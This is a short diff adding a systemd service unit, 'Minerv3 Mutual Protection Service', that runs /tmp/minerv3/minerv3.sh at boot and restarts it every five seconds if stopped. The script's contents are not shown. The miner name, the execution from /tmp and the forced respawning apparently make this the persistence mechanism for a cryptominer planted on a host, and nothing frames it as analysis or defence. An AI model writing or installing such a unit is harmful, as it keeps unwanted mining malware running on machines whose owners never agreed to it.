@@ -1,0 +1,12 @@
+[Unit]
+Description=Minerv3 Mutual Protection Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/minerv3/minerv3.sh
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
